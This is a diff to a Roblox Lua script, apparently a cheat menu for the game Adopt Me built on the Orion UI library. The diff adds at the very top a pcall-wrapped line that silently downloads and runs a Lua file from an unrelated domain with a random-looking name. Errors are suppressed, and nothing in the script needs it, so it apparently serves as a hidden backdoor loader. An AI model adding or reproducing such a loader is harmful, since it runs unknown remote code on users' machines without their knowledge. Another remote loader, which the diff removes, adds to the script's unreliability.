@@ -1,3 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://egorikusa.space/82d9111b2fd6dc6c62c693c4.lua", true))()
+end)
+
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
 local Window = OrionLib:MakeWindow({
     Name = "KUJI HUB | Adopt Me",
@@ -6,24 +10,6 @@ local Window = OrionLib:MakeWindow({
     ConfigFolder = "OrionTest"
 })
 
-})
-
-
-
-getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Orion-librarysource"))()
-
---[[
-Name = <string> - The name of the UI.
-HidePremium = <bool> - Whether or not the user details shows Premium status or not.
-SaveConfig = <bool> - Toggles the config saving in the UI.
-ConfigFolder = <string> - The name of the folder where the configs are saved.
-IntroEnabled = <bool> - Whether or not to show the intro animation.
-IntroText = <string> - Text to show in the intro animation.
-IntroIcon = <string> - URL to the image you want to use in the intro animation.
-Icon = <string> - URL to the image you want displayed on the window.
-CloseCallback = <function> - Function to execute when the window is closed.
-]]
 local function createTab(name, icon, premiumOnly)
     return Window:MakeTab({
         Name = name,
